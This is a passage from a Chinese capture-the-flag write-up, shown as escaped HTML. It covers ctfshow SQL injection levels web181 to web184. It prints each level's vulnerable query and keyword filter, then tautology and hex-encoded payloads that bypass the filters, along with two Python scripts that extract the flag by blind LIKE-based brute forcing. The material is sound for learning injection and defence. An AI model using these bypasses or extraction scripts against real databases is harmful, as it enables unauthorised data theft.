0&amp;#39;or(id=26)and&amp;#39;1&amp;#39;=&amp;#39;1
-1&amp;#39;or(id=26)and&amp;#39;1&amp;#39;=&amp;#39;1

#传入数据库为(id = &amp;#39;&amp;#39;) OR (id = 26 AND &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;)    and的优先级大于or
#最终false OR (true AND true) → true
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250426093043695.png&#34; alt=&#34;image-20250426093043695&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;img data-src=&#34;\images\article_images\image-20250426093158501.png&#34; alt=&#34;image-20250426093158501&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web181&#34;&gt;&lt;a href=&#34;#web181&#34; class=&#34;headerlink&#34; title=&#34;web181&#34;&gt;&lt;/a&gt;web181&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;//拼接sql语句查找指定ID用户
$sql = &amp;quot;select id,username,password from ctfshow_user where username !=&amp;#39;flag&amp;#39; and id = &amp;#39;&amp;quot;.$_GET[&amp;#39;id&amp;#39;].&amp;quot;&amp;#39; limit 1;&amp;quot;;


返回逻辑
//对传入的参数进行了过滤
  function waf($str)&amp;#123;
    return preg_match(&amp;#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&amp;#39;, $str);
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;OR (username)=&amp;#39;flag&amp;#39;&lt;/code&gt; → 如果表里有一条记录满足 &lt;code&gt;username=&amp;#39;flag&amp;#39;&lt;/code&gt;，则条件为真&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39;or(username)=&amp;#39;flag
-1&amp;#39;or(id)=&amp;#39;26
-1&amp;#39;||username=&amp;#39;flag
-1&amp;#39;||id=&amp;#39;26
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824220401797.png&#34; alt=&#34;image-20250824220401797&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用万能密码&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;&amp;#39;or(id=26)and&amp;#39;1&amp;#39;=&amp;#39;1
&amp;#39;or(id=26)and&amp;#39;1
0&amp;#39;or(id=26)and&amp;#39;1
-1&amp;#39;or(id=26)and&amp;#39;1
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250426095518027.png&#34; alt=&#34;image-20250426095518027&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;img data-src=&#34;\images\article_images\image-20250426094555175.png&#34; alt=&#34;image-20250426094555175&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web182&#34;&gt;&lt;a href=&#34;#web182&#34; class=&#34;headerlink&#34; title=&#34;web182&#34;&gt;&lt;/a&gt;web182&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;//拼接sql语句查找指定ID用户
$sql = &amp;quot;select id,username,password from ctfshow_user where username !=&amp;#39;flag&amp;#39; and id = &amp;#39;&amp;quot;.$_GET[&amp;#39;id&amp;#39;].&amp;quot;&amp;#39; limit 1;&amp;quot;;


返回逻辑
//对传入的参数进行了过滤
  function waf($str)&amp;#123;
    return preg_match(&amp;#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i&amp;#39;, $str);
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39;or((username)=concat(&amp;quot;fl&amp;quot;,&amp;quot;ag&amp;quot;))and&amp;#39;1&amp;#39;=&amp;#39;1
-1&amp;#39;||username=(concat(&amp;quot;fl&amp;quot;,&amp;quot;ag&amp;quot;))and&amp;#39;1
-1&amp;#39;or(id)=&amp;#39;26
-1&amp;#39;||id=&amp;#39;26
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824221444937.png&#34; alt=&#34;image-20250824221444937&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用万能密码&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;&amp;#39;or(id=26)and&amp;#39;1&amp;#39;=&amp;#39;1
&amp;#39;or(id=26)and&amp;#39;1
0&amp;#39;or(id=26)and&amp;#39;1
-1&amp;#39;or(id=26)and&amp;#39;1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web183&#34;&gt;&lt;a href=&#34;#web183&#34; class=&#34;headerlink&#34; title=&#34;web183&#34;&gt;&lt;/a&gt;web183&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;查询语句
//拼接sql语句查找指定ID用户
  $sql = &amp;quot;select count(pass) from &amp;quot;.$_POST[&amp;#39;tableName&amp;#39;].&amp;quot;;&amp;quot;;


返回逻辑
//对传入的参数进行了过滤
  function waf($str)&amp;#123;
    return preg_match(&amp;#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&amp;#39;, $str);
  &amp;#125;


查询结果
//返回用户表的记录总数
      $user_count = 0;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt; &lt;strong&gt;&lt;code&gt;%&lt;/code&gt; 代表通配符（任意字符串）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;%&lt;/code&gt; URL编码为 &lt;code&gt;%25&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可以通过回显值判断flag是否正确&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;tableName=(ctfshow_user)where(pass)like&amp;#39;ctfshow%25&amp;#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824222922226.png&#34; alt=&#34;image-20250824222922226&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;脚本post&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824224700335.png&#34; alt=&#34;image-20250824224700335&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
import time

# ==================== 配置区 ====================
# 目标 URL
URL = &amp;quot;http://62068be2-b35f-44b9-a953-dcf9022c5953.challenge.ctf.show/select-waf.php&amp;quot;

# POST 请求参数配置
POST_NAME = &amp;quot;tableName&amp;quot;                # POST 的 name
POST_VALUE_PREFIX = &amp;quot;(ctfshow_user)where(pass)like&amp;#39;&amp;quot;  # value 的前缀
POST_VALUE_SUFFIX = &amp;quot;%&amp;#39;&amp;quot;                # value 的后缀

# 可选字符集，根据实际 flag 特点可以缩小范围提高效率
CHARSET = &amp;quot;0123456789abcdefghijklmnopqrstuvwxyz&amp;#123;&amp;#125;-&amp;quot;

# 已知 flag 前缀
PREFIX = &amp;quot;ctfshow&amp;#123;&amp;quot;

# 最大尝试长度（避免死循环）
MAX_LEN = 45

# 每次请求之间的延迟，避免被 WAF 封禁
SLEEP_TIME = 0.05

# 服务器响应里判断条件是否成立的关键字
SUCCESS_KEY = &amp;quot;$user_count = 1&amp;quot;

# ==================== 脚本逻辑 ====================

def brute_force():
    flag = PREFIX
    for i in range(len(PREFIX), MAX_LEN):
        found = False
        for ch in CHARSET:
            payload = f&amp;quot;&amp;#123;POST_VALUE_PREFIX&amp;#125;&amp;#123;flag + ch&amp;#125;&amp;#123;POST_VALUE_SUFFIX&amp;#125;&amp;quot;
            data = &amp;#123;POST_NAME: payload&amp;#125;

            try:
                res = requests.post(url=URL, data=data, timeout=5)
            except requests.exceptions.RequestException as e:
                print(f&amp;quot;[!] 请求出错: &amp;#123;e&amp;#125;&amp;quot;)
                continue

            if SUCCESS_KEY in res.text:
                flag += ch
                print(f&amp;quot;[+] 已发现: &amp;#123;flag&amp;#125;&amp;quot;)
                found = True
                if ch == &amp;quot;&amp;#125;&amp;quot;:   # flag 结束标志
                    print(f&amp;quot;[✓] 最终 flag: &amp;#123;flag&amp;#125;&amp;quot;)
                    return flag
                break

        if not found:
            print(&amp;quot;[!] 没找到下一个字符，可能 flag 完成或 CHARSET 不全&amp;quot;)
            break

        time.sleep(SLEEP_TIME)

if __name__ == &amp;quot;__main__&amp;quot;:
    brute_force()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web184&#34;&gt;&lt;a href=&#34;#web184&#34; class=&#34;headerlink&#34; title=&#34;web184&#34;&gt;&lt;/a&gt;web184&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;查询语句
//拼接sql语句查找指定ID用户
  $sql = &amp;quot;select count(*) from &amp;quot;.$_POST[&amp;#39;tableName&amp;#39;].&amp;quot;;&amp;quot;;


返回逻辑
//对传入的参数进行了过滤
  function waf($str)&amp;#123;
    return preg_match(&amp;#39;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&amp;#39;|\&amp;quot;|union|\`|sleep|benchmark/i&amp;#39;, $str);
  &amp;#125;


查询结果
//返回用户表的记录总数
      $user_count = 0;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;RIGHT JOIN&lt;/code&gt; 右连接&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.基本概念&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;RIGHT JOIN&lt;/code&gt;（也叫 &lt;strong&gt;右连接&lt;/strong&gt;）是 SQL 中的 &lt;strong&gt;表连接&lt;/strong&gt;方式之一，它用于从 &lt;strong&gt;两个表中获取数据&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;右表&lt;/strong&gt;（&lt;code&gt;RIGHT JOIN&lt;/code&gt; 后面的表）中的所有记录都会被保留。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;左表&lt;/strong&gt;（&lt;code&gt;RIGHT JOIN&lt;/code&gt; 前面的表）中如果没有匹配的记录，则对应的字段会返回 &lt;code&gt;NULL&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;换句话说，它是 &lt;code&gt;LEFT JOIN&lt;/code&gt; 的“镜像”：保留的是右表的全部行。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;2.语法&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;SELECT 列名
FROM 表1
RIGHT JOIN 表2
ON 表1.字段 = 表2.字段;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;表1&lt;/code&gt;：左表&lt;/li&gt;
&lt;li&gt;&lt;code&gt;表2&lt;/code&gt;：右表&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ON 表1.字段 = 表2.字段&lt;/code&gt;：连接条件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT 列名&lt;/code&gt;：可以选择左表、右表或两表的字段&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;：如果右表中的某行在左表中没有匹配，则左表字段返回 &lt;code&gt;NULL&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.示例&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;假设有两个表：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;表 &lt;code&gt;students&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;id&lt;/th&gt;
&lt;th&gt;name&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;Alice&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;Bob&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;Carol&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;表 &lt;code&gt;scores&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;student_id&lt;/th&gt;
&lt;th&gt;score&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;90&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;85&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;88&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;我们用 &lt;code&gt;RIGHT JOIN&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;SELECT students.id, students.name, scores.score
FROM students
RIGHT JOIN scores
ON students.id = scores.student_id;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;结果：&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;id&lt;/th&gt;
&lt;th&gt;name&lt;/th&gt;
&lt;th&gt;score&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;Alice&lt;/td&gt;
&lt;td&gt;90&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;Bob&lt;/td&gt;
&lt;td&gt;85&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;NULL&lt;/td&gt;
&lt;td&gt;NULL&lt;/td&gt;
&lt;td&gt;88&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;解释：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;student_id = 1&lt;/code&gt; → 匹配，返回 Alice 的信息&lt;/li&gt;
&lt;li&gt;&lt;code&gt;student_id = 2&lt;/code&gt; → 匹配，返回 Bob 的信息&lt;/li&gt;
&lt;li&gt;&lt;code&gt;student_id = 4&lt;/code&gt; → 不匹配左表，返回 &lt;code&gt;NULL&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;ctfshow%    16进制编码后--&amp;gt;   0x63746673686f7725
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;MySQL 会自动把 &lt;code&gt;0x63746673686f7725&lt;/code&gt; 当作字符串处理，可以绕过单引号过滤&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;ctfshow_user AS a&lt;/code&gt;：把表 &lt;code&gt;ctfshow_user&lt;/code&gt; 起别名 &lt;code&gt;a&lt;/code&gt;。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;RIGHT JOIN ctfshow_user AS b&lt;/code&gt;：右连接同一个表，起别名 &lt;code&gt;b&lt;/code&gt;，用于自己跟自己做条件匹配。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;ON b.pass LIKE &amp;#39;ctfshow%&amp;#39;&lt;/code&gt;：连接条件是 b 表的 pass 字段以 &lt;code&gt;ctfshow&lt;/code&gt; 开头。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;count(pass)&lt;/code&gt;：统计符合条件的记录数。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;回显 &lt;code&gt;$user_count=43&lt;/code&gt; 则判断正确&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;tableName=ctfshow_user as a right join ctfshow_user as b on b.pass like 0x63746673686f7725
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824232254620.png&#34; alt=&#34;image-20250824232254620&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250824232425039.png&#34; alt=&#34;image-20250824232425039&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
import time
import binascii

# ==================== 配置区 ====================
URL = &amp;quot;http://fb220894-1420-42b2-9cb9-a595c452d077.challenge.ctf.show/select-waf.php&amp;quot;

POST_NAME = &amp;quot;tableName&amp;quot;
POST_VALUE_PREFIX = &amp;quot;ctfshow_user as a right join ctfshow_user as b on b.pass like &amp;quot;
CHARSET = &amp;quot;0123456789abcdefghijklmnopqrstuvwxyz&amp;#123;&amp;#125;-&amp;quot;
PREFIX = &amp;quot;ctfshow&amp;#123;&amp;quot;
MAX_LEN = 45
SLEEP_TIME = 0.05
SUCCESS_KEY = &amp;quot;$user_count = 43&amp;quot;

# ==================== 工具函数 ====================
def to_hex(s: str) -&amp;gt; str:
    &amp;quot;&amp;quot;&amp;quot;把字符串转换成 MySQL HEX 形式&amp;quot;&amp;quot;&amp;quot;
    str_16 = binascii.b2a_hex(s.encode(&amp;#39;utf-8&amp;#39;))
    return str_16.decode()

# ==================== 脚本逻辑 ====================
def brute_force():
    flag = PREFIX
    for i in range(len(PREFIX), MAX_LEN):
        found = False
        for ch in CHARSET:
            # 每次把 flag + 当前字符 + % 转 HEX
            hex_payload = &amp;quot;0x&amp;quot; + to_hex(flag + ch + &amp;quot;%&amp;quot;)
            payload = f&amp;quot;&amp;#123;POST_VALUE_PREFIX&amp;#125;&amp;#123;hex_payload&amp;#125;&amp;quot;
            data = &amp;#123;POST_NAME: payload&amp;#125;

            try:
                res = requests.post(url=URL, data=data, timeout=5)
            except requests.exceptions.RequestException as e:
                print(f&amp;quot;[!] 请求出错: &amp;#123;e&amp;#125;&amp;quot;)
                continue

            if SUCCESS_KEY in res.text:
                flag += ch
                print(f&amp;quot;[+] 已发现: &amp;#123;flag&amp;#125;&amp;quot;)
                found = True
                if ch == &amp;quot;&amp;#125;&amp;quot;:  
                    print(f&amp;quot;[✓] 最终 flag: &amp;#123;flag&amp;#125;&amp;quot;)
                    return flag
                break

        if not found:
            print(&amp;quot;[!] 没找到下一个字符，可能 flag 完成或 CHARSET 不全&amp;quot;)
            break

        time.sleep(SLEEP_TIME)

if __name__ == &amp;quot;__main__&amp;quot;:
    brute_force()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
